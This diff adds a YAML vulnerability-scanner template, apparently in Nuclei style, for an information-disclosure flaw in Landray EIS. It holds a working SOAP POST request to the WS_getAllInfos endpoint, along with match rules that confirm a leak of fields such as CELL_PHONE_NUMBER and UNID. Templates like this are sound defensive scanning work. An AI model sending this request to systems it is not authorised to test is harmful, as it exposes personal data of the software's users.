@@ -1,0 +1,41 @@
+id: landray-eis-ws-infoleak
+brief:
+    title: Landray EIS WS_getAllInfos - Information Disclosure
+    by: Fur1na
+    level: high
+    about: Landray EIS WS_getAllInfos interface suffers from a sensitive information disclosure vulnerability.
+    label:
+        - landray
+        - eis
+        - info-leak
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/WS/Basic/Basic.asmx'
+      head:
+        Content-Type: text/xml
+      body: |-
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <tem:WS_getAllInfos/>
+        </soapenv:Body>
+        </soapenv:Envelope>
+      signs:
+        - "on": word
+          has:
+            - <?xml
+            - WS_getAllInfosResponse
+            - CELL_PHONE_NUMBER
+            - UNID
+          in: body
+          need: all
+        - "on": word
+          has:
+            - 'Content-Type: text/xml'
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
